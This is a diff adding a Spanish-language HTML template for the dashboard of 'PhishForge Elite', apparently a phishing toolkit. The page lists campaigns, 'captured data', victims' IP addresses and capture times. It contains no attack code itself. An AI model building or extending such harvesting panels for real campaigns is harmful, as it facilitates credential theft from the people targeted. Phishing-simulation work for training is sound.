@@ -1,0 +1,35 @@
+{% extends "layout.html" %}
+{% block title %}Panel de Control - PhishForge Elite{% endblock %}
+{% block content %}
+<div class="card">
+    <h2>Panel de Control</h2>
+    <p>Bienvenido a PhishForge Elite. Usa la barra lateral para navegar.</p>
+</div>
+<div class="card">
+    <h3>Actividad Reciente</h3>
+    <table class="table">
+        <thead>
+            <tr>
+                <th>Campaña</th>
+                <th>Datos Capturados</th>
+                <th>Dirección IP</th>
+                <th>Fecha y Hora</th>
+            </tr>
+        </thead>
+        <tbody>
+            {% for item in data %}
+            <tr>
+                <td>{{ item.campaign }}</td>
+                <td>{{ item.data }}</td>
+                <td>{{ item.ip_address }}</td>
+                <td>{{ item.captured_at }}</td>
+            </tr>
+            {% else %}
+            <tr>
+                <td colspan="4" style="text-align: center;">Aún no se han capturado datos.</td>
+            </tr>
+            {% endfor %}
+        </tbody>
+    </table>
+</div>
+{% endblock %}
